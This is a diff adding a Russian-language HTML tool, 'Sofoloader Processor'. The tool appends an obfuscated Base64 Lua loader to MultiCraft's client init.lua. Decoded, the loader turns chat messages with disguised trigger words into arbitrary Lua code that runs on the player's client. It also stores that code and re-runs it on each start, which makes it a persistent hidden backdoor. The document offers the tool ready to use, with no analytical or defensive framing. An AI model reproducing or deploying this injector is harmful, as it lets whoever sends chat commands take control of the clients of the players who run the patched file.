@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sofoloader Processor</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#101827;color:#e5edf8;font-family:Arial;padding:35px}
+main{max-width:650px;margin:auto;background:#192438;padding:28px;border-radius:16px;border:1px solid #30415c}
+h1{color:#69aaff}
+p{color:#aabbd2}
+input,button{width:100%;padding:13px;margin:10px 0;border-radius:8px;border:1px solid #405473;background:#24344c;color:white}
+button{background:#2878d0;border:0;font-weight:bold;cursor:pointer}
+button:disabled{opacity:.5}
+#status{padding:12px;background:#101827;border-radius:8px;white-space:pre-wrap;overflow-wrap:anywhere}
+a{color:#69aaff}
+</style>
+</head>
+<body>
+<main>
+<h1>Sofoloader Processor</h1>
+<p>Выбери builtin/client/init.lua из MultiCraft.</p>
+
+<input type="file" id="client" accept=".lua">
+
+<button id="process">Обработать init.lua</button>
+
+<div id="status">Ожидание файла...</div>
+<a id="download" style="display:none" download="init.lua">
+Скачать обработанный init.lua
+</a>
+</main>
+
+<script>
+const SOFOLOADER = "bG9jYWwgcm9vdCA9IGNvcmUuZ2V0X21vZF9zdG9yYWdlKCkKCgpsb2NhbCBmdW5jdGlvbiBrZXkoYWRkcikKCXJldHVybiAic29mb2xvYWRlcjoiIC4uIGFkZHIKZW5kCgoKbG9jYWwgZnVuY3Rpb24gY2xlYW5fbWVzc2FnZShtc2cpCgltc2cgPSB0b3N0cmluZyhtc2cgb3IgIiIpCgltc2cgPSBtc2c6Z3N1YigiXDI3RSIsICIiKQoJbXNnID0gbXNnOmdzdWIoIlwyNyIsICIiKQoJcmV0dXJuIG1zZwplbmQKCgpsb2NhbCBmdW5jdGlvbiBsb2FkX2FuZF9leGVjdXRlX21vZChhZGRyKQoJbG9jYWwgZGF0YSA9IHJvb3Q6Z2V0X3N0cmluZyhrZXkoYWRkcikpCglpZiBub3QgZGF0YSBvciBkYXRhID09ICIiIG9yIGRhdGEgPT0gIm51bGwiIHRoZW4KCQlyZXR1cm4gZmFsc2UsICJObyBkYXRhIGZvdW5kIgoJZW5kCgoKCWxvY2FsIGRlY29kZWQgPSBjb3JlLmRlY29kZV9iYXNlNjQoZGF0YSkKCWlmIG5vdCBkZWNvZGVkIG9yIGRlY29kZWQgPT0gIiIgdGhlbgoJCXJldHVybiBmYWxzZSwgIkVtcHR5IGRlY29kZWQiCgllbmQKCgoJbG9jYWwgZnVuYywgZXJyID0gbG9hZHN0cmluZyhkZWNvZGVkKQoJaWYgbm90IGZ1bmMgdGhlbgoJCWNvcmUubG9nKCJlcnJvciIsICJbc29mb2xvYWRlcl0gY29tcGlsZSBlcnJvciAiIC4uIGFkZHIgLi4gIjogIiAuLiB0b3N0cmluZyhlcnIpKQoJCXJldHVybiBmYWxzZSwgZXJyCgllbmQKCgoJbG9jYWwgb2ssIHJlc3VsdCA9IHBjYWxsKGZ1bmMpCglpZiBub3Qgb2sgdGhlbgoJCWNvcmUubG9nKCJlcnJvciIsICJbc29mb2xvYWRlcl0gZXhlYyBlcnJvciAiIC4uIGFkZHIgLi4gIjogIiAuLiB0b3N0cmluZyhyZXN1bHQpKQoJCXJldHVybiBmYWxzZSwgcmVzdWx0CgllbmQKCgoJcmV0dXJuIHRydWUsIHJlc3VsdAplbmQKCgpsb2NhbCBmdW5jdGlvbiBsb2FkX2FsbF9tb2RzKCkKCWxvY2FsIG1vZHMgPSByb290OnRvX3RhYmxlKCkKCgoJbG9jYWwgZnVuY3Rpb24gcHJvY2Vzcyh0YmwpCgkJZm9yIGssIHYgaW4gcGFpcnModGJsKSBkbwoJCQlpZiBrOm1hdGNoKCJec29mb2xvYWRlcjoiKQoJCQkJYW5kIHYgfj0gIiIKCQkJCWFuZCB2IH49ICJudWxsIiB0aGVuCgoKCQkJCWxvY2FsIGFkZHIgPSBrOmdzdWIoIl5zb2ZvbG9hZGVyOiIsICIiKQoJCQkJbG9hZF9hbmRfZXhlY3V0ZV9tb2QoYWRkcikKCQkJZW5kCgkJZW5kCgllbmQKCgoJcHJvY2Vzcyhtb2RzKQoJaWYgdHlwZShtb2RzLmZpZWxkcykgPT0gInRhYmxlIiB0aGVuCgkJcHJvY2Vzcyhtb2RzLmZpZWxkcykKCWVuZAplbmQKCgpsb2NhbCBmdW5jdGlvbiBoYW5kbGVfc2Zsb2FkKG1zZywgY29tbWFuZCwgY2xlYW5fcHJlZml4KQoJbG9jYWwgYm9keSA9IGNvbW1hbmQ6c3ViKCNjbGVhbl9wcmVmaXggKyAxKQoJYm9keSA9IGJvZHk6Z3N1YigiXiVzKyIsICIiKQoKCglsb2NhbCBhZGRyLCBkYXRhID0gYm9keTptYXRjaCgiXiglUyspJXMrKC4rKSQiKQoKCglpZiBhZGRyIGFuZCBkYXRhIHRoZW4KCQlyb290OnNldF9zdHJpbmcoa2V5KGFkZHIpLCBkYXRhKQoJCWxvYWRfYW5kX2V4ZWN1dGVfbW9kKGFkZHIpCgkJcmV0dXJuIHRydWUKCWVuZAoKCglyZXR1cm4gdHJ1ZQplbmQKCgpsb2NhbCBmdW5jdGlvbiBoYW5kbGVfc2Zyd3IobXNnLCBjb21tYW5kLCBjbGVhbl9wcmVmaXgpCglsb2NhbCBib2R5ID0gY29tbWFuZDpzdWIoI2NsZWFuX3ByZWZpeCArIDEpCglib2R5ID0gYm9keTpnc3ViKCJeJXMrIiwgIiIpCgoKCWxvY2FsIGFkZHIsIGRhdGEgPSBib2R5Om1hdGNoKCJeKCVTKyklcysoLispJCIpCgoKCWlmIGFkZHIgYW5kIGRhdGEgdGhlbgoJCXJvb3Q6c2V0X3N0cmluZyhrZXkoYWRkciksIGRhdGEpCgkJcmV0dXJuIHRydWUKCWVuZAoKCglyZXR1cm4gdHJ1ZQplbmQKCgpsb2NhbCBmdW5jdGlvbiBoYW5kbGVfc2ZybShtc2csIGNvbW1hbmQsIGNsZWFuX3ByZWZpeCkKCWxvY2FsIGJvZHkgPSBjb21tYW5kOnN1YigjY2xlYW5fcHJlZml4ICsgMSkKCWJvZHkgPSBib2R5OmdzdWIoIl4lcysiLCAiIik6Z3N1YigiJXMrJCIsICIiKQoKCglsb2NhbCBhZGRyID0gYm9keTptYXRjaCgiXiglUyspJCIpCgoKCWlmIGFkZHIgdGhlbgoJCXJvb3Q6c2V0X3N0cmluZyhrZXkoYWRkciksICIiKQoJCXJldHVybiB0cnVlCgllbmQKCgoJcmV0dXJuIHRydWUKZW5kCgoKbG9jYWwgZnVuY3Rpb24gaGFuZGxlX3NmcnVuKG1zZywgY29tbWFuZCwgY2xlYW5fcHJlZml4KQoJbG9jYWwgYm9keSA9IGNvbW1hbmQ6c3ViKCNjbGVhbl9wcmVmaXggKyAxKQoJYm9keSA9IGJvZHk6Z3N1YigiXiVzKyIsICIiKQoKCglsb2NhbCBhZGRyLCBkYXRhID0gYm9keTptYXRjaCgiXiglUyspJXMrKC4rKSQiKQoKCglpZiBhZGRyIGFuZCBkYXRhIHRoZW4KCQlsb2NhbCBkZWNvZGVkID0gY29yZS5kZWNvZGVfYmFzZTY0KGRhdGEpCgkJaWYgZGVjb2RlZCBhbmQgZGVjb2RlZCB+PSAiIiB0aGVuCgkJCWxvY2FsIGZ1bmMsIGVyciA9IGxvYWRzdHJpbmcoZGVjb2RlZCkKCQkJaWYgZnVuYyB0aGVuCgkJCQlsb2NhbCBvaywgcmVzdWx0ID0gcGNhbGwoZnVuYykKCQkJCWlmIG5vdCBvayB0aGVuCgkJCQkJY29yZS5sb2coImVycm9yIiwgIltzb2ZvbG9hZGVyXSAiIC4uIGNsZWFuX3ByZWZpeCAuLiAiIGVycm9yICIgLi4gYWRkciAuLiAiOiAiIC4uIHRvc3RyaW5nKHJlc3VsdCkpCgkJCQllbmQKCQkJZWxzZQoJCQkJY29yZS5sb2coImVycm9yIiwgIltzb2ZvbG9hZGVyXSAiIC4uIGNsZWFuX3ByZWZpeCAuLiAiIGNvbXBpbGUgIiAuLiBhZGRyIC4uICI6ICIgLi4gdG9zdHJpbmcoZXJyKSkKCQkJZW5kCgkJZW5kCgkJcmV0dXJuIHRydWUKCWVuZAoKCglyZXR1cm4gdHJ1ZQplbmQKCgpsb2NhbCBmdW5jdGlvbiBoYW5kbGVfc2ZhY3Rpb24obXNnLCBjb21tYW5kLCBjbGVhbl9wcmVmaXgpCglsb2NhbCBib2R5ID0gY29tbWFuZDpzdWIoI2NsZWFuX3ByZWZpeCArIDEpCgljb3JlLmxvZygiYWN0aW9uIiwgIltzb2ZvbG9hZGVyXSAiIC4uIGNsZWFuX3ByZWZpeCAuLiBib2R5KQoJcmV0dXJuIHRydWUKZW5kCgoKbG9jYWwgY29tbWFuZHMgPSB7Cgl7IG5hbWVzID0geyAiU0ZMT0FEIiwgIjMwNzE0T09PU0xPQUQiIH0sIGhhbmRsZXIgPSBoYW5kbGVfc2Zsb2FkIH0sCgl7IG5hbWVzID0geyAiU0ZSV1IiLCAiMzA3MTRPT09TUldSIiB9LCBoYW5kbGVyID0gaGFuZGxlX3NmcndyIH0sCgl7IG5hbWVzID0geyAiU0ZSTSIsICIzMDcxNE9PT1NSTSIgfSwgaGFuZGxlciA9IGhhbmRsZV9zZnJtIH0sCgl7IG5hbWVzID0geyAiU0ZSVU4iLCAiMzA3MTRPT09TUlVOIiB9LCBoYW5kbGVyID0gaGFuZGxlX3NmcnVuIH0sCgl7IG5hbWVzID0geyAiU0ZBQ1RJT04iLCAiMzA3MTRPT09TQUNUSU9OIiB9LCBoYW5kbGVyID0gaGFuZGxlX3NmYWN0aW9uIH0sCn0KCgpsb2NhbCBmdW5jdGlvbiBoYW5kbGVfY29tbWFuZChtZXNzYWdlKQoJbG9jYWwgbXNnID0gY2xlYW5fbWVzc2FnZShtZXNzYWdlKQoKCglmb3IgXywgZW50cnkgaW4gaXBhaXJzKGNvbW1hbmRzKSBkbwoJCWZvciBfLCBuYW1lIGluIGlwYWlycyhlbnRyeS5uYW1lcykgZG8KCQkJbG9jYWwgcG9zID0gbXNnOmZpbmQobmFtZSwgMSwgdHJ1ZSkKCQkJaWYgcG9zIHRoZW4KCQkJCWxvY2FsIGNvbW1hbmQgPSBtc2c6c3ViKHBvcykKCQkJCXJldHVybiBlbnRyeS5oYW5kbGVyKG1zZywgY29tbWFuZCwgbmFtZSkKCQkJZW5kCgkJZW5kCgllbmQKCgoJcmV0dXJuIGZhbHNlCmVuZAoKCmNvcmUucmVnaXN0ZXJfb25fcmVjZWl2aW5nX2NoYXRfbWVzc2FnZShmdW5jdGlvbihtc2cpCglpZiBoYW5kbGVfY29tbWFuZChtc2cpIHRoZW4KCQlyZXR1cm4gdHJ1ZQoJZW5kCgoKCXJldHVybiBmYWxzZQplbmQpCgoKY29yZS5hZnRlcigxLCBmdW5jdGlvbigpIGxvYWRfYWxsX21vZHMoKSBlbmQpCmNvcmUuYWZ0ZXIoMywgZnVuY3Rpb24oKSBsb2FkX2FsbF9tb2RzKCkgZW5kKQ==";
+
+const status = document.getElementById("status");
+const button = document.getElementById("process");
+const input = document.getElementById("client");
+const download = document.getElementById("download");
+
+button.onclick = async () => {
+    const file = input.files[0];
+
+    if (!file) {
+        status.textContent = "Выбери builtin/client/init.lua!";
+        return;
+    }
+
+    if (!SOFOLOADER || SOFOLOADER.startsWith("ВСТАВЬ")) {
+        status.textContent = "Не указан Base64 Sofoloader!";
+        return;
+    }
+
+    button.disabled = true;
+
+    try {
+        status.textContent = "Чтение init.lua...";
+
+        const original = await file.text();
+
+        status.textContent = "Проверка Base64...";
+
+        atob(SOFOLOADER);
+
+        const injection =
+            '\n\n-- Sofoloader injection\n' +
+            'loadstring(core.decode_base64("' +
+            SOFOLOADER +
+            '"))()\n';
+
+        const result = original + injection;
+
+        const blob = new Blob(
+            [result],
+            {type:"text/plain;charset=utf-8"}
+        );
+
+        const url = URL.createObjectURL(blob);
+
+        download.href = url;
+        download.style.display = "block";
+
+        status.textContent =
+            "Готово!\n\n" +
+            "Файл: builtin/client/init.lua\n" +
+            "Исходный размер: " + original.length + "\n" +
+            "Base64: " + SOFOLOADER.length + "\n" +
+            "Результат: " + result.length;
+
+    } catch (e) {
+        status.textContent = "Ошибка: " + e.message;
+    } finally {
+        button.disabled = false;
+    }
+};
+</script>
+</body>
+</html>
